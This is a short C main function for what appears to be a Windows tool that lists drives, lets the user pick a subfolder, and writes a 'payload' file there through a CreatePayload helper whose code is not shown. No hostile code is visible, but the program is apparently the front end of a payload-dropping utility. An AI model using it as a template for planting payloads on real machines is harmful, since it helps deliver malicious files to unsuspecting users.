#include "Printers.h"
#include "choosers.h"


int main(void) {
	LPWSTR pFilepath = PrintDrives();
	PrintSubFolders(pFilepath);
	HANDLE hFile = CreatePayload(pFilepath);
	printf("Payload Created Successfully! :)\n");
	printf("Press 'Enter' To Exit! :)");
	free(pFilepath);
	return 0;
}

